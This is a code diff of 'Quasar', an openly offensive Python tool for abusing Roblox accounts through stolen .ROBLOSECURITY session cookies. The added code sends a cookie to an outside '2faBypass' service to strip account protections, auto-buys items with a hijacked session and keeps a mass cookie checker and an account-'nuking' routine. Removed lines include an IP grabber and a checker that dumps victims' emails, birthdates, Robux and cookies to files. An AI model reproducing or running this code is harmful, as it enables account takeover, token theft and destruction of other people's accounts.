@@ -1,167 +1,160 @@
-# made by 0x256 
-# 2.0.0 (without bypassing)
-# outdated
-# TODO: create new bypass server
+# Quasar - Tool for roblox
+# Creator - 0x256
+# Website: quasar.gt.tc
+# __   __         __  _  __ _____        _____ __  _  _  ____  _         __  __  ___   _______ _  _ _ __  _  __        _  
+#| _\ /__\   __  |  \| |/__\_   _|  __  |_   _/__\| || |/ _/ || |  __   /  \|  \| \ `v' /_   _| || | |  \| |/ _]  __  / \ 
+#| v | \/ | |__| | | ' | \/ || |   |__|   | || \/ | \/ | \_| >< | |__| | /\ | | ' |`. .'  | | | >< | | | ' | [/\ |__| \_/ 
+#|__/ \__/       |_|\__|\__/ |_|          |_| \__/ \__/ \__/_||_|      |_||_|_|\__| !_!   |_| |_||_|_|_|\__|\__/      (_) 
+#
+# If you dont know python
+#########################################################################################################################
+# TODO: Create bypass method 
+#########################################################################################################################
 
+import os
+os.system('cls' if os.name == 'nt' else 'clear')
+print("initialized")
 import subprocess
-
-
+print("subprocess loaded")
+import os
+print("os loaded")
+import string
+print("string loaded")
+import sys
+print("sys loaded")
+import json
+print("json loaded")
 
 try:
     from pyisemail import is_email
-    from pystyle import Colorate, Colors, Add, Center, Write, Anime, Box
+    print("pyisemail loaded")
+    from pystyle import Colorate, Colors, Add, Center, Write
+    print("pystyle loaded")
     import requests
+    print("requests loaded")
     import threading
+    print("threading loaded")
     from queue import Queue
-    from tqdm import tqdm
-    import sys
+    print("queue loaded")
     import time
-    import os
-    import subprocess
+    print("time loaded")
+    from webbrowser import open
+    print("webbrowser loaded")
     from termcolor import cprint
+    print("termcolor loaded")
     import random
+    print("random loaded")
     import socket
+    print("pysocket loaded")
+    from tqdm import tqdm
+    print("tqdm loaded")
     import glob
+    print("glob loaded")
     from rich.console import Console
-except:
+    print("rich.console loaded")
+
+except ImportError as e:
+    print(f"\033[31m[ERROR] Missing package: {e}. Installing required packages...")
+    
     try:
         import pip
     except ImportError:
-        os.system("")
-        print("[", end="")
-        print("] ", end="")
-        print("\033[31m" + "[ERROR] Pip not installed. Installing now...")
+        print("\033[31m[ERROR] Pip not installed. Installing now...")
         subprocess.call(
             "curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True
         )
         time.sleep(5)
-        os.system("get-pip.py")
-    print("[", end="")
-    print("] ", end="")
-    print("\033[31m" + "[ERROR] Packages not installed. Installing now...")
-    subprocess.call("pip install termcolor", shell=True)
-    subprocess.call("pip install requests", shell=True)
-    subprocess.call("pip install pystyle", shell=True)
-    subprocess.call("pip install os", shell=True)
-    subprocess.call("pip install time", shell=True)
-    subprocess.call("pip install random", shell=True)
-    subprocess.call("pip install pyisemail", shell=True)
-    subprocess.call("pip install socket", shell = True)
-    subprocess.call("pip install Console", shell = True)
-    subprocess.call("pip install glob", shell = True)
-    subprocess.call("pip install queue", shell = True)
+        os.system("python get-pip.py")
+    
+
+    user_profile = os.environ['USERPROFILE'] if os.name == 'nt' else os.environ['HOME']
+    
+
+    packages = [
+        "termcolor", "requests", "pystyle", "pyisemail", 
+        "tqdm", "rich", "socket", "glob2"
+    ]
+    
+    for package in packages:
+        try:
+            print(f"Installing {package}...")
+            subprocess.call(f"pip install {package}", shell=True)
+        except Exception as e:
+            print(f"\033[31m[ERROR] Failed to install {package}: {e}")
+
 finally:
-    from pyisemail import is_email
-    from pystyle import Colorate, Colors, Add, Center, Write, Anime, Box
-    import requests
-    import socket
-    import threading
-    import glob
-    import time
-    from tqdm import tqdm
-    import os
-    import sys
-    import subprocess
-    from termcolor import cprint
-    from queue import Queue
-    import random
-    from rich.console import Console
+    # Reattempt imports after installation
+    try:
+        from pyisemail import is_email
+        print("pyisemail loaded")
+        from pystyle import Colorate, Colors, Add, Center, Write
+        print("pystyle loaded")
+        import requests
+        print("requests loaded")
+        import threading
+        print("threading loaded")
+        from queue import Queue
+        print("queue loaded")
+        import time
+        print("time loaded")
+        from webbrowser import open
+        print("webbrowser loaded")
+        from termcolor import cprint
+        print("termcolor loaded")
+        import random
+        print("random loaded")
+        import socket
+        print("pysocket loaded")
+        from tqdm import tqdm
+        print("tqdm loaded")
+        import glob
+        print("glob loaded")
+        from rich.console import Console
+        print("rich.console loaded")
+    except ImportError as e:
+        print(f"\033[31m[CRITICAL ERROR] Failed to import after installation: {e}")
+        sys.exit(1)
 
-#########################################################################################################################################
-#########################################################################################################################################
-#########################################################################################################################################
-#########################################################################################################################################
+print("LOADED MODULES!")
 
-
-def getBanner():
-	bannerText = """
-
-"""
-	
-	bannerLogo = """
-         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-         ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-         ░▒▓█▓▒░                                                                      
-            ░▒▓██▓▒░             
-
-"""
-
-	banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
-	return banner
-
-def getChecker():
-	bannerText = """
-
-"""
-	
-	bannerLogo = """
-         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-         ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-         ░▒▓█▓▒░                                                                      
-          ░▒▓██▓▒░                                                                    
-                                                                                                 
-"""
-
-	banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
-	return banner
-
-if os.name == "nt":
-    os.system("cls")
-else:
-    os.system("clear")
-print('')
-Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
-print(getBanner())
-import requests
-import re
-import string
-import time
-import os
-from pystyle import Colorate, Colors, Add, Center, Write
-
-
+## SETTINGS ##
 year = time.localtime().tm_year
 day = time.localtime().tm_mday
 month = time.localtime().tm_mon
+version = "2.0.0"
+cookies_folder = "cookies"
+## STARTING ##
 
+def getBanner():
+	bannerText = """
+    
+"""
+	
+	bannerLogo = """
+                                                                       
+  █████   █    ██  ▄▄▄        ██████  ▄▄▄       ██▀███  
+▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██    ▒ ▒████▄    ▓██ ▒ ██▒
+▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░ ▓██▄   ▒██  ▀█▄  ▓██ ░▄█ ▒
+░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██   ▒   ██▒░██▄▄▄▄██ ▒██▀▀█▄  
+░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██████▒▒ ▓█   ▓██▒░██▓ ▒██▒
+░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░
+ ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░
+   ░   ░  ░░░ ░ ░   ░   ▒   ░  ░  ░    ░   ▒     ░░   ░ 
+    ░       ░           ░  ░      ░        ░  ░   ░     
+                                                        
+            Made With Love By 0x256                                                     
+"""
 
-def download_file(url, filepath):
-    try:
-        response = requests.get(url, stream=True)
-        response.raise_for_status()
-        total_size = int(response.headers.get('content-length', 0))
-        with open(filepath, 'wb') as file, tqdm(
-            total=total_size, unit='B', unit_scale=True, desc=f"Downloading {os.path.basename(filepath)}"
-        ) as progress_bar:
-            for chunk in response.iter_content(chunk_size=8192):
-                file.write(chunk)
-                progress_bar.update(len(chunk))
-    except Exception as e:
-        print(f"Error while loading {os.path.basename(filepath)}: {e}")
-
-
-
+	banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
+	return banner
 
 def check_version(version):
-    Write.Print(f"Checking for updates...\n", Colors.orange, interval=0.0025)
+    Write.Print(f"Checking for updates...\n", Colors.purple, interval=0.0025)
     try:
         response = requests.get("https://raw.githubusercontent.com/QuasarRBX/Quasar/refs/heads/main/version")
         latest_version = response.text.strip()
         if latest_version != version:
-            Write.Print(f"New version available. Downloading {latest_version} from the Github!\n", Colors.red, interval=0.0025)
-            current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
-            url = f"https://github.com/QuasarRBX/Quasar/releases/download/{latest_version}/Quasar.exe"
-            download_file(url, os.path.join(current_dir, "Quasar.exe"))
+            Write.Print(f"New version available. Please update to version {latest_version} from the Github! \n", Colors.red, interval=0.0025)
             os.system("pause")
         else:
             Write.Print(f"Newest version!\n", Colors.green, interval=0.0025)
@@ -174,7 +167,6 @@ def check_version(version):
             print(getBanner())
             GetNumber()
 
-
             
 
     except requests.exceptions.RequestException:
@@ -182,7 +174,21 @@ def check_version(version):
     except:
         pass
 
-version = "2.0.0" #outdated
+## START!!! ##
+
+if os.name == "nt":
+    os.system("cls")
+else:
+    os.system("clear")
+print('')
+print(getBanner())
+
+#########################################################################################################################################
+#########################################################################################################################################
+#########################################################################################################################################
+#########################################################################################################################################
+
+## MAIN CODE ##
 
 def masscheck():
     cookiefilefolder = os.path.dirname(__file__)
@@ -216,126 +222,165 @@ def masscheck():
         print("Valid Cookie(s): " + str(validcount) + "\nInvalid Cookie(s):" + str(invalidcount))
     else:
         print("No cookies found.")
-    Write.Input("Press any key to exit: ", Colors.orange, interval=0.0025)
+    Write.Input("Press any key to exit: ", Colors.purple, interval=0.0025)
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
     print(getBanner())
     GetNumber()
-
-def RobloxIp():
-    username = os.getenv('username')
-    Write.Print("""
-    How to use:
-    Join a Roblox game and wait until the game fully loads
-    Run this script while in the game
-    Press enter when you are ready to pull the IP!\n\n""", Colors.purple_to_blue, interval=0.0025)
-    try:
-        Write.Input("Press [ENTER] to grab the IP!", Colors.purple_to_blue, interval=0.0025)
-    except SyntaxError:
-        pass
-    list_of_files = glob.glob(r'C:\users\{}\AppData\Local\Roblox\logs\*'.format(username))
-    latest_file = max(list_of_files, key=os.path.getctime)
-    roblox_log = open(latest_file, 'r')
-
-    for line in roblox_log:
-        if 'Connection accepted from' in line:
+def bypass(cookie, type):
+    if type == "RemoveAll":
+        url = "https://immortal.rs/dashboard/api/misc/2faBypass.php"
+        requests.Timeout = 999999999
+        headers = {
+            'Content-Type': 'application/json'
+        }
+        payload = {
+            "Cookie": cookie,
+            "Type": type
+        }
+        
+        try:
+            response = requests.post(
+                url,
+                headers=headers,
+                data=json.dumps(payload)
+            )
             
-            line = line.replace('Connection accepted from', '')
-            line2 = line.replace('|', ':')
-            line3 = line2[25:]
-            Write.Print(f"Server IP: {line3}\n", Colors.purple_to_blue, interval=0.0025)
-
-
-            ip_history = open('server_ips.txt', 'a+')
-            ip_history.write(line3 + "\n")
-            ip_history.close()
+            response.raise_for_status()
+            data = response.json()
+            return data["msg"]
             os.system("pause")
-            if os.name == "nt":
-                os.system("cls")
-            else:
-                os.system("clear")
+        except requests.exceptions.RequestException as e:
+            return e
+            os.system("pause")
+    if type == "Age":
+        url = "https://immortal.rs/dashboard/api/misc/2faBypass.php"
+        requests.Timeout = 999999999
+        headers = {
+            'Content-Type': 'application/json'
+        }
+        payload = {
+            "Cookie": cookie,
+            "Type": type
+        }
+        
+        try:
+            response = requests.post(
+                url,
+                headers=headers,
+                data=json.dumps(payload)
+            )
+            
+            response.raise_for_status()
+            data = response.json()
+            return data["msg"]
+            os.system("pause")
+        except requests.exceptions.RequestException as e:
+            return e
+            os.system("pause")
+    os.system("pause")
+    time.sleep(5)
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+    print(getBanner())
+    GetNumber()
+    
 
 def BuyAll():
     cookie = Write.Input(f"Cookie to free-item-buyer: ", Colors.purple_to_blue, interval=0.0025)
-    session = requests.Session()
-    session.cookies.update({".ROBLOSECURITY": cookie})
+    try:
+        session = requests.Session()
+        session.cookies.update({".ROBLOSECURITY": cookie})
 
-    console = Console(highlight=False)
-
-
-    def cprint(color: str, content: str) -> None:
-        console.print(f"[ [bold {color}]>[/] ] {content}")
+        console = Console(highlight=False)
 
 
-    def fetch_items() -> None:
-        result = {}
-        cursor = ""
-
-        while cursor is not None:
-            req = session.get(
-                f"https://catalog.roblox.com/v1/search/items/details?category=All&creatorTargetId=1&limit=30&maxPrice=0&cursor={cursor}"
-            )
-            res = req.json()
-
-            if req.status_code == 429:
-                cprint("red", "Rate limited. Waiting 20 seconds")
-                time.sleep(20)
-                continue
-
-            for item in res.get("data", []):
-                item_name = item.get("name")
-                result[item_name] = item.get("productId")
-                cprint("blue", f"Found {item_name}")
-
-            cursor = res.get("nextPageCursor")
-
-        return result
+        def cprint(color: str, content: str) -> None:
+            console.print(f"[ [bold {color}]>[/] ] {content}")
 
 
-    def purchase(name: str, product_id: int) -> None:
-        req = session.post("https://auth.roblox.com/v2/login")
-        csrf_token = req.headers["x-csrf-token"]
+        def fetch_items() -> None:
+            result = {}
+            cursor = ""
 
-        while True:
-            req = session.post(
-                f"https://economy.roblox.com/v1/purchases/products/{product_id}",
-                json={"expectedCurrency": 1, "expectedPrice": 0, "expectedSellerId": 1},
-                headers={"X-CSRF-TOKEN": csrf_token},
-            )
+            while cursor is not None:
+                req = session.get(
+                    f"https://catalog.roblox.com/v1/search/items/details?category=All&creatorTargetId=1&limit=30&maxPrice=0&cursor={cursor}"
+                )
+                res = req.json()
 
-            if req.status_code == 429:
-                cprint("red", "Rate limited. Waiting 60 seconds")
-                time.sleep(60)
-                continue
+                if req.status_code == 429:
+                    cprint("red", "Rate limited. Waiting 20 seconds")
+                    time.sleep(20)
+                    continue
 
-            res = req.json()
-            if "reason" in res and res.get("reason") == "AlreadyOwned":
-                cprint("yellow", f"{name} is already owned")
+                for item in res.get("data", []):
+                    item_name = item.get("name")
+                    result[item_name] = item.get("productId")
+                    cprint("blue", f"Found {item_name}")
+
+                cursor = res.get("nextPageCursor")
+
+            return result
+
+
+        def purchase(name: str, product_id: int) -> None:
+            req = session.post("https://auth.roblox.com/v2/login")
+            csrf_token = req.headers["x-csrf-token"]
+
+            while True:
+                req = session.post(
+                    f"https://economy.roblox.com/v1/purchases/products/{product_id}",
+                    json={"expectedCurrency": 1, "expectedPrice": 0, "expectedSellerId": 1},
+                    headers={"X-CSRF-TOKEN": csrf_token},
+                )
+
+                if req.status_code == 429:
+                    cprint("red", "Rate limited. Waiting 60 seconds")
+                    time.sleep(60)
+                    continue
+
+                res = req.json()
+                if "reason" in res and res.get("reason") == "AlreadyOwned":
+                    cprint("yellow", f"{name} is already owned")
+                    return
+
+                cprint("green", f"Successfully purchased {name}")
                 return
 
-            cprint("green", f"Successfully purchased {name}")
-            return
+
+        def main() -> None:
+            free_items = fetch_items()
+            for name, product_id in free_items.items():
+                purchase(name, product_id)
 
 
-    def main() -> None:
-        free_items = fetch_items()
-        for name, product_id in free_items.items():
-            purchase(name, product_id)
+        main()
+    except Exception as e:
+        Write.Print(e, Colors.red, interval=0.0025)
+        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)
 
 
-    main()
 
-# Disconected cuz roblox deleted pins
 
 def Pin_Cracker():
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
+    
     print(getBanner())
-    GetNumber()
+    print('Hello there! Roblox officialy closed pin system in accounts. Now you can bypass age and email!')
+    print('')
+
+    Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)
+
+
     
 
 def Nucker():
@@ -525,7 +570,7 @@ def Nucker():
                 threading.Thread(target=self.changeLanguage).start()
                 threading.Thread(target=self.removeItems).start()
                 threading.Thread(target=self.messageAll, args=(self.message,)).start()
-                Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
+                Write.Input("Press any key to exit", Colors.purple, interval=0.0025)
                 os.system("cls")
                 print('')
                 print(getBanner())
@@ -540,245 +585,251 @@ def Nucker():
                 clear()
                 print(getBanner())
                 self.check()
-    Nuke()
-    Write.Input("[UNKNOW ERROR] Press any key to exit", Colors.red, interval=0.0025)
-    if os.name == "nt":
-        os.system("cls")
-    else:
-        os.system("clear")
-    print(getBanner())
-    GetNumber()
+    try:
+        Nuke()
+    except Exception as e:
+        Write.Print(e, Colors.red, interval=0.0025)
+        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)
 
-
-def CookieGenerator():
-
-    outputfile = open("Gen_cookies.txt")
-
-    x = 0
-    cookies = []
-    intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
-    n = 0
-    c = int(Write.Input("How many cookie you want to generate?: ", Colors.purple_to_blue, interval=0.0025))
-    Write.Print("Generating random cookies... please be patient! \n", Colors.red, interval=0.0025)
-
-    letters = 'ABCDEF'
-
-    while x < c:
-
-
-        cookies =  intro +  ''.join(random.choices(letters + string.digits, k=1640))
-
-        x = x + 1
-        
-        f = open(outputfile)
-        f.write(f'{cookies}\n')
-        f.close()
-
-    outputfile.close()
-
-    Write.Print("Done! IF any valid cookies were found, they have been added to the hits.txt file! \n", Colors.purple_to_blue, interval=0.0025)
-    Write.Input("Press any key to exit", Colors.red, interval=0.0025)
-    if os.name == "nt":
-        os.system("cls")
-    else:
-        os.system("clear")
-    print(getBanner())
-    GetNumber()
-
-def check(cookie):
-
-  Emmail = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
-  email = Emmail['verified']
-  EmailName = Emmail['emailAddress']
-  Write.Print(f"[Process] Get email...\n", Colors.orange, interval=0.0025)
-  credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
-  Write.Print(f"[Process] Get credit...\n", Colors.orange, interval=0.0025)
-  userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
-  birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
-  Write.Print(f"[Process] Get birthday...\n", Colors.orange, interval=0.0025)
-  userid = userdata['id'] #user id
-  followers = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
-  Write.Print(f"[Process] Get followers...\n", Colors.orange, interval=0.0025)
-  Write.Print(f"[Process] Get userId...\n", Colors.orange, interval=0.0025)
-
-  transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
-  pending = transactions['pendingRobuxTotal']
-  Write.Print(f"[Process] Get Pending...\n", Colors.orange, interval=0.0025)
-  stipends = transactions['premiumStipendsTotal']
-  Write.Print(f"[Process] Get stipends...\n", Colors.orange, interval=0.0025)
-  devEx = transactions['developerExchangeTotal']
-  Write.Print(f"[Process] Get DevEX...\n", Colors.orange, interval=0.0025)
-  groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
-  groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
-  groupFunds = 0
-  for i in groupIds:
-    groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
-  creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
-  display = userdata['displayName'] #display name
-  Write.Print(f"[Process] Get Display...\n", Colors.orange, interval=0.0025)
-  username = userdata['name'] #username
-  Write.Print(f"[Process] Get Username...\n", Colors.orange, interval=0.0025)
-  robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
-  robux = robuxdata['robux'] #get robux balance
-  Write.Print(f"[Process] Get Robux...\n", Colors.orange, interval=0.0025)
-  #does the user have premium?
-  premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
-  #get rap
-  rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
-  while rap_dict['nextPageCursor'] != None:
-      rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
-  rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
-  birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
-  thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
-  image_url = thumbnail["data"][0]["imageUrl"]
-  pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
-  pin_bool = pindata["isEnabled"] #does the user have a pin
-  Write.Print(f"Username: {username}, url= https://roblox.com/users/{userid}\n", Colors.purple_to_blue, interval=0.0025)
-  file = f"{username}_cookie.txt"
-  with open(file, 'a+') as f:
-   f.write(f"Username: {username} | ")
-  Write.Print(f"Display name: {display}\n", Colors.purple_to_blue, interval=0.0025)
-  Write.Print(f"User ID: {userid}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"UserID: {userid} | ")
-  Write.Print(f"Robux: {robux}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Robux: {robux} | ")
-  Write.Print(f"Has pin: {pin_bool}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Has pin: {pin_bool} | ")
-  if pin_bool == True:
-    Write.Print(f"[advice]: Use Jupiter pin cracker!\n", Colors.orange, interval=0.0025)
-  Write.Print(f"Premium: {premiumbool}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Premium: {premiumbool} | ")
-  Write.Print(f"Credit: {credit}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Credit: {credit} | ")
-  Write.Print(f"Birthday: {birthdate}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"birthday: {birthdate} | ")
-  Write.Print(f"Groups: {groupIds}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Groups: {groupIds} | ")
-  Write.Print(f"Rap: {rap}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Rap: {rap} | ")
-  Write.Print(f"Is email verified: {email}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Email verified: {email} | ")
-  Write.Print(f"Email: {EmailName}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Email name: {EmailName} | ")
-  Write.Print(f"group founds: {groupFunds}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Group founds: {groupFunds} | ")
-  Write.Print(f"Dev exchange: {devEx}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"DEVx exchange: {devEx} | ")
-  with open(file, 'a+') as f:
-   f.write(f"followers: {followers} | ")
-  Write.Print(f"Pending: {pending}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Pending: {pending} | ")
-  Write.Print(f"Premium Stipends: {stipends}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Premium Stipends: {stipends} | ")
-  Write.Print(f"Followers: {followers}\n", Colors.purple_to_blue, interval=0.0025)
-  with open(file, 'a+') as f:
-   f.write(f"Display name: {display} | ")
-  with open(file, 'a+') as f:
-   f.write(f"Cookie: {cookie} | ")
-  with open(file, 'a+') as f:
-   f.write(f"Quasar cookie checker by 0x256. Saved on: {day}.{month}.{year}")
-  cookie = Write.Input(f"Press any key to exit", Colors.orange, interval=0.0025)
-
-  Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
-  if os.name == "nt":
-    os.system("cls")
-  else:
-    os.system("clear")
-  print('')
-  print(getBanner())
-  GetNumber()
 
 
 def GruupFind():
-    def groupfinder(suma):
-        try:
-            id = random.randint(1000000, 1150000)
-            r = requests.get(f"https://www.roblox.com/groups/group.aspx?gid={id}", timeout=30)
-            if 'owned' not in r.text:
-                re = requests.get(f"https://groups.roblox.com/v1/groups/{id}", timeout=30)
-                if re.status_code != 429:
-                    if 'errors' not in re.json():
-                        if 'isLocked' not in re.text and 'owner' in re.text:
-                            if re.json()['publicEntryAllowed'] == True and re.json()['owner'] == None:
-                                Write.Print(f"[+] Hit: {id}\n", Colors.purple_to_blue, interval=0.0025)
-                                suma+=1
+    try:
+
+        def groupfinder(suma):
+            try:
+                id = random.randint(1000000, 1150000)
+                r = requests.get(f"https://www.roblox.com/groups/group.aspx?gid={id}", timeout=30)
+                if 'owned' not in r.text:
+                    re = requests.get(f"https://groups.roblox.com/v1/groups/{id}", timeout=30)
+                    if re.status_code != 429:
+                        if 'errors' not in re.json():
+                            if 'isLocked' not in re.text and 'owner' in re.text:
+                                if re.json()['publicEntryAllowed'] == True and re.json()['owner'] == None:
+                                    Write.Print(f"[+] Hit: {id}\n", Colors.green_to_cyan, interval=0.0025)
+                                    suma+=1
+                                else:
+                                    Write.Print(f"[-] No Entry: {id}\n", Colors.green_to_cyan, interval=0.0025)
                             else:
-                                Write.Print(f"[-] No Entry: {id}\n", Colors.purple_to_blue, interval=0.0025)
-                        else:
-                            Write.Print(f"[-] Group Locked: {id}\n", Colors.purple_to_blue, interval=0.0025)
+                                Write.Print(f"[-] Group Locked: {id}\n", Colors.green_to_cyan, interval=0.0025)
+                    else:
+                        Write.Print(f"[-] Group API Rate Limited\n", Colors.green_to_cyan, interval=0.0025)
                 else:
-                    Write.Print(f"[-] Group API Rate Limited\n", Colors.purple_to_blue, interval=0.0025)
-            else:
-                Write.Print(f"[-] Group Already Owned: {id}\n", Colors.purple_to_blue, interval=0.0025)
-        except:
-            pass
-            return suma
+                    Write.Print(f"[-] Group Already Owned: {id}\n", Colors.green_to_cyan, interval=0.0025)
+            except:
+                pass
+                return suma
 
-    if os.name == "nt":
-        os.system("cls")
-    else:
-        os.system("clear")
+        inputa =  Write.Input("[-] How many repeats: ", Colors.purple_to_blue, interval=0.0025)
+        threads = int(inputa)
+        suma = 0
+        while threads!=0:
+            groupfinder(suma)
+            threads = threads-1
 
-    print('')
+        Write.Input(f"Sum of the resulting groups: {suma}. Press any key to exit", Colors.purple, interval=0.0025)
+        
+    except Exception as e:
+        Write.Print(e, Colors.red, interval=0.0025)
+        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)
 
